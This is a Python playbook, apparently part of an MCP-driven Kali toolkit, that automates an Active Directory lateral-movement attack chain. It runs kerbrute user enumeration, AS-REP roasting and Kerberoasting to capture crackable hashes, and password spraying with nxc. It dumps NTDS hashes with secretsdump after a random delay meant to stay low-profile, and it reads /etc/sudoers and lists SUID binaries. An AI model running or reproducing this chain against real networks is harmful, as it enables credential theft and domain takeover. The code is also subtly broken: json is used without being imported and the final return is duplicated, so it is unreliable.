#!/usr/bin/env python3
"""internal_lateral playbook: AD/Kerberos 内网横向攻击链（CyberStrike 方法论落地）。

阶段: 域发现 -> 用户枚举(kerbrute) -> AS-REP/Kerberoast 抓取 -> 密码喷洒(nxc)
     -> 哈希传递 -> SMB/PSExec 横向 -> 凭证收割(secretsdump) -> 提权检查
"""

from __future__ import annotations

import time
from typing import Any, Dict, List, Optional

from kali_mcp.core.action_log import log_action
from kali_mcp.core.evidence_store import save_evidence
from kali_mcp.core.findings_store import list_findings
from kali_mcp.core.target_graph import get_graph
from kali_mcp.core.task_workspace import get_workspace
from kali_mcp.core.verifier import register_candidate

DEPTH_PROFILE = {
    "quick": {
        "domain_enum": True,
        "kerbrute_userenum": True,
        "asrep_roast": False,
        "kerberoast": False,
        "password_spray": False,
        "smb_share_enum": False,
    },
    "standard": {
        "domain_enum": True,
        "kerbrute_userenum": True,
        "asrep_roast": True,
        "kerberoast": True,
        "password_spray": False,
        "smb_share_enum": True,
    },
    "thorough": {
        "domain_enum": True,
        "kerbrute_userenum": True,
        "asrep_roast": True,
        "kerberoast": True,
        "password_spray": True,
        "smb_share_enum": True,
        "secret_dump": True,
        "priv_escalation_check": True,
    },
}


def _normalize_host(target: str) -> str:
    t = (target or "").strip()
    return t


def run_internal_lateral(executor, target: str, depth: str = "standard",
                         domain: str = "", user: str = "", password: str = "",
                         userlist: str = "", passlist: str = "") -> Dict[str, Any]:
    """内网横向攻击链：按深度档位执行 AD/Kerberos 攻击。

    Args:
        target: 域控制器/内网主机 IP
        domain: 目标域名（如 corp.local）
        user: 已知用户（用于 Kerberoast/密码喷洒）
        password: 已知密码
        userlist: 用户字典路径（kerbrute userenum）
        passlist: 密码字典路径（密码喷洒）
    """
    profile = DEPTH_PROFILE.get(depth, DEPTH_PROFILE["standard"])
    host = _normalize_host(target)
    steps: List[Dict[str, Any]] = []
    findings: List[Dict[str, Any]] = []

    def _run_step(step_name: str, tool: str, data: Dict[str, Any], timeout: int = 120) -> Dict[str, Any]:
        try:
            result = executor.execute_tool_with_data(tool, data)
            entry = {
                "phase": "internal_lateral",
                "tool": tool,
                "target": host,
                "success": bool(result.get("success")),
                "output": (result.get("output") or "")[:800],
                "duration": result.get("duration", 0),
            }
            try:
                log_action(host, phase="internal_lateral", target=host, tool=tool,
                           exit_code=result.get("return_code"),
                           duration_ms=entry["duration"])
            except Exception:
                pass
            steps.append(entry)
            return result
        except Exception as e:
            entry = {"phase": "internal_lateral", "tool": tool, "target": host,
                     "success": False, "output": f"ERR {e}", "duration": 0}
            steps.append(entry)
            return {"success": False, "output": str(e)}

    # 1. 域发现（nxc 探测 SMB + 域信息）
    if profile["domain_enum"]:
        r = _run_step("domain_enum", "nxc",
                      {"proto": "smb", "target": host, "additional_args": ""})
        out = r.get("output", "")
        if "signing:" in out or "hostname:" in out or "Domain" in out:
            findings.append({
                "title": f"AD 域信息泄露 {host}",
                "severity": "info",
                "description": out[:300],
                "phase": "internal_lateral",
            })

    # 2. Kerbrute 用户枚举（无锁定风险，只枚举不爆破）
    if profile["kerbrute_userenum"] and userlist:
        r = _run_step("kerbrute_userenum", "kerbrute",
                      {"mode": "userenum", "target": domain or host,
                       "users": userlist, "additional_args": "--dc " + host})
        out = r.get("output", "")
        import re
        found_users = re.findall(r"\[!\] Valid user: (\S+)", out)
        if found_users:
            findings.append({
                "title": f"有效域用户枚举 {host}",
                "severity": "medium",
                "description": f"发现 {len(found_users)} 个有效用户: {found_users[:10]}",
                "phase": "internal_lateral",
            })

    # 3. AS-REP Roasting（无需密码）
    if profile["asrep_roast"] and userlist:
        r = _run_step("asrep_roast", "GetNPUsers",
                      {"target": f"{domain}/", "dc": host,
                       "additional_args": f"-usersfile {userlist} -format hashcat"})
        out = r.get("output", "")
        if "$krb5asrep" in out:
            findings.append({
                "title": f"AS-REP Roast 可离线破解 {host}",
                "severity": "high",
                "description": "发现无预认证账户，哈希已捕获（hashcat -m 18200）",
                "phase": "internal_lateral",
            })

    # 4. Kerberoasting（有凭据时）
    if profile["kerberoast"] and user and password and domain:
        r = _run_step("kerberoast", "GetUserSPNs",
                      {"target": f"{domain}/{user}:{password}", "dc": host,
                       "request": "-request", "additional_args": ""})
        out = r.get("output", "")
        if "$krb5tgs" in out:
            findings.append({
                "title": f"Kerberoast 服务账户 {host}",
                "severity": "high",
                "description": "SPN 账户哈希已捕获（hashcat -m 13100）",
                "phase": "internal_lateral",
            })

    # 5. 密码喷洒（有用户+密码字典时）
    if profile["password_spray"] and userlist and passlist:
        r = _run_step("password_spray", "nxc",
                      {"proto": "smb", "target": host, "user": userlist,
                       "password": passlist, "additional_args": "--no-bruteforce"})
        out = r.get("output", "")
        if "[+]" in out:
            findings.append({
                "title": f"密码喷洒命中 {host}",
                "severity": "critical",
                "description": out[:300],
                "phase": "internal_lateral",
            })

    # 6. SMB 共享枚举
    if profile["smb_share_enum"] and user and password:
        r = _run_step("smb_share_enum", "nxc",
                      {"proto": "smb", "target": host, "user": user,
                       "password": password, "additional_args": "--shares"})
        out = r.get("output", "")
        if "READ" in out or "WRITE" in out:
            findings.append({
                "title": f"SMB 可访问共享 {host}",
                "severity": "medium",
                "description": out[:300],
                "phase": "internal_lateral",
            })

    # 7. Secretsdump（域控/高权限）— stealth 低调
    if profile.get("secret_dump") and user and password and domain:
        import random as _rnd2, time as _time2
        _time2.sleep(_rnd2.uniform(3.0, 8.0))
        r = _run_step("secret_dump", "secretsdump",
                      {"target": f"{domain}/{user}:{password}@{host}", "additional_args": ""})
        out = r.get("output", "")
        if "Administrator:" in out or "krbtgt:" in out:
            findings.append({
                "title": f"NTDS 哈希收割 {host}",
                "severity": "critical",
                "description": "凭据哈希已捕获（DCSync/secretsdump）",
                "phase": "internal_lateral",
            })

    # 8. 提权检查
    if profile.get("priv_escalation_check"):
        # 通过 ssh 后端执行本地提权检查
        try:
            from kali_mcp.core.backend import ssh_execute
            r = ssh_execute(
                "find / -perm -4000 -type f 2>/dev/null | head -20; "
                "cat /etc/sudoers 2>/dev/null | head -5; "
                "uname -a",
                timeout=60,
            )
            out = r.get("output", "")
            if out:
                findings.append({
                    "title": f"主机提权面 {host}",
                    "severity": "info",
                    "description": out[:400],
                    "phase": "internal_lateral",
                })
        except Exception:
            pass

    # 汇总
    summary = {
        "target": host,
        "depth": depth,
        "steps_run": len(steps),
        "steps_ok": sum(1 for s in steps if s["success"]),
        "findings": findings,
    }
    try:
        save_evidence(
            host, name="internal_lateral",
            content=json.dumps(summary, ensure_ascii=False, default=str),
            meta={"target": host, "depth": depth},
        )
    except Exception:
        pass
    return summary
    return summary
